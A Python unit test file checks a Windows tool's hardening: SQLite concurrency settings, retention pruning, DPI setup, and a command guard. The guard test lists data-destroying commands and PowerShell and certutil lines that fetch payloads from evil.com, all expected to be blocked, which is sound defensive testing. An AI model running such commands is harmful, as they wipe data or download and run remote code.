"""Unit Tests for Batch 6 Hardening & Resilience:
- Centralized SQLite Concurrency with WAL & Busy Timeout (db_utils.py)
- Command Injection & Chaining Security Audit (windows_tools.execute_safe_command)
- Global Per-Monitor DPI Awareness (windows_tools.enable_dpi_awareness)
- Automated Retention Pruning (event_log.py & focus_tracker.py)
"""
import os
import time
import tempfile
import threading
import unittest
import db_utils
import windows_tools
import event_log
import focus_tracker

class TestBatch6Hardening(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.db_path = os.path.join(self.temp_dir.name, "test_hardening.db")

    def tearDown(self):
        try:
            self.temp_dir.cleanup()
        except Exception:
            pass

    def test_database_wal_and_busy_timeout(self):
        with db_utils.get_db_connection(self.db_path) as conn:
            # Verify busy_timeout
            timeout_row = conn.execute("PRAGMA busy_timeout;").fetchone()
            self.assertGreaterEqual(timeout_row[0], 5000)

            # Verify WAL journal mode (for persistent file DB)
            journal_row = conn.execute("PRAGMA journal_mode;").fetchone()
            self.assertEqual(journal_row[0].lower(), 'wal')

    def test_concurrent_sqlite_writes(self):
        # Create test table
        with db_utils.get_db_connection(self.db_path) as conn:
            conn.execute("CREATE TABLE concurrent_test (id INTEGER PRIMARY KEY, worker_id INT, val TEXT);")
            conn.commit()

        errors = []

        def worker(wid):
            try:
                for i in range(15):
                    with db_utils.get_db_connection(self.db_path) as conn:
                        conn.execute("INSERT INTO concurrent_test (worker_id, val) VALUES (?, ?)", (wid, f"item_{i}"))
                        conn.commit()
                    time.sleep(0.01)
            except Exception as e:
                errors.append(e)

        threads = [threading.Thread(target=worker, args=(w,)) for w in range(4)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        self.assertEqual(len(errors), 0, f"Concurrent write errors encountered: {errors}")

        with db_utils.get_db_connection(self.db_path) as conn:
            count = conn.execute("SELECT COUNT(*) FROM concurrent_test;").fetchone()[0]
            self.assertEqual(count, 4 * 15)

    def test_execute_safe_command_security_guardrails(self):
        # 1. Blocked destructive commands
        destructive = [
            "rmdir /s /q C:\\Windows",
            "del /f /s C:\\*",
            "format D: /fs:ntfs",
            "diskpart",
            "reg delete HKLM\\Software",
            "shutdown /s /t 0"
        ]
        for cmd in destructive:
            ok, msg = windows_tools.execute_safe_command(cmd)
            self.assertFalse(ok, f"Expected command to be blocked: {cmd}")
            self.assertIn("blocked", msg.lower())

        # 2. Blocked evasion & download bypasses
        evasion = [
            "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
            "powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
            "powershell IEX (New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')",
            "irm http://evil.com/x.ps1 | iex",
            "certutil -urlcache -split -f http://evil.com/payload.exe",
            "powershell -executionpolicy bypass -file script.ps1",
            "echo hello | powershell"
        ]
        for cmd in evasion:
            ok, msg = windows_tools.execute_safe_command(cmd)
            self.assertFalse(ok, f"Expected evasion to be blocked: {cmd}")
            self.assertIn("blocked", msg.lower())

        # 3. Allowed safe commands
        safe = "git status"
        ok, msg = windows_tools.execute_safe_command(safe)
        self.assertNotIn("blocked", msg.lower())

    def test_dpi_awareness_call(self):
        # Function must execute cleanly on Windows without unhandled crash
        try:
            windows_tools.enable_dpi_awareness()
            success = True
        except Exception:
            success = False
        self.assertTrue(success)

    def test_automated_retention_pruning(self):
        # 1. Event log pruning (> 14 days)
        old_ts = time.time() - (20 * 86400) # 20 days ago
        recent_ts = time.time() - 3600       # 1 hour ago

        event_log.log_event("test_type", "Ancient event", occurred_at=old_ts, db_path=self.db_path)
        event_log.log_event("test_type", "Recent event", occurred_at=recent_ts, db_path=self.db_path)

        # Prune events older than 14 days
        event_log.clear_old_events(days=14, db_path=self.db_path)

        events = event_log.get_events_since(old_ts - 100, limit=10, db_path=self.db_path)
        self.assertEqual(len(events), 1)
        self.assertEqual(events[0]['event_summary'], "Recent event")

        # 2. Focus tracker pruning (> 30 days)
        focus_tracker.init_focus_db(db_path=self.db_path)
        old_focus_ts = time.time() - (45 * 86400) # 45 days ago
        recent_focus_ts = time.time() - 1800      # 30 min ago

        focus_tracker.record_focus_session("OldApp.exe", "Old Title", duration_seconds=600, occurred_at=old_focus_ts, db_path=self.db_path)
        focus_tracker.record_focus_session("Code.exe", "main.py", duration_seconds=900, occurred_at=recent_focus_ts, db_path=self.db_path)

        # Prune sessions older than 30 days
        focus_tracker.clear_old_sessions(days=30, db_path=self.db_path)

        with db_utils.get_db_connection(self.db_path) as conn:
            rows = conn.execute("SELECT application_name FROM focus_sessions").fetchall()
            apps = [r['application_name'] for r in rows]
            self.assertIn("Code.exe", apps)
            self.assertNotIn("OldApp.exe", apps)

if __name__ == '__main__':
    unittest.main()
